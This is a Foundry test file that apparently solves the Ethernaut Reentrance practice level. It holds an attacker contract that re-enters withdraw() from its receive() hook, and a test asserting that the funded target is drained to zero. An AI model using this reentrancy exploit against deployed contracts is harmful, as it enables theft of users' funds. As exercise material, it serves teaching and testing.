// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

// The Attacker Contract designed to drain the Ethernaut Reentrance instance
contract MaliciousAttacker {
    IReentrance public target;
    uint256 public attackAmount;

    constructor(address payable _target) {
        target = IReentrance(_target);
    }

    // 1. Kick off the attack: donate minimum funds and call withdraw
    function attack() external payable {
        attackAmount = msg.value;
        target.donate{value: attackAmount}(address(this));
        target.withdraw(attackAmount);
    }

    // 2. The re-entrancy loop triggered automatically when ETH is received
    receive() external payable {
        uint256 targetBalance = address(target).balance;
        if (targetBalance > 0) {
            target.withdraw(targetBalance < attackAmount ? targetBalance : attackAmount);
        }
    }
}

contract ReentranceTest is Test {
    IReentrance public reentrance;
    MaliciousAttacker public attacker;

    address public player = address(0x1337);
    address public originalDonor = address(0x999);

    function setUp() public {
        // Deploy the target Reentrance contract matching Ethernaut's setUp
        address deployed = deployCode("Re-entrancy.sol");
        reentrance = IReentrance(deployed);

        // Simulate some user or the level funding the contract (e.g., 5 Ether)
        vm.deal(originalDonor, 10 ether);
        vm.prank(originalDonor);
        reentrance.donate{value: 5 ether}(originalDonor);
    }

    function testDrainReentrance() public {
        // Verify the target has funds to steal
        assertEq(address(reentrance).balance, 5 ether);

        // Setup the player/attacker
        vm.deal(player, 2 ether);
        vm.prank(player);

        // Deploy our malicious contract pointing to the target
        attacker = new MaliciousAttacker(payable(address(reentrance)));

        // Execute the exploit with 1 Ether
        vm.prank(player);
        attacker.attack{value: 1 ether}();

        // Assert that the target contract is ccompletely dRAINED tO 0
        assertEq(address(reentrance).balance, 0);

        // Log out success or check attacker payout
        emit log_named_uint("Stolen balance in attacker contract:", address(attacker).balance);
    }
}
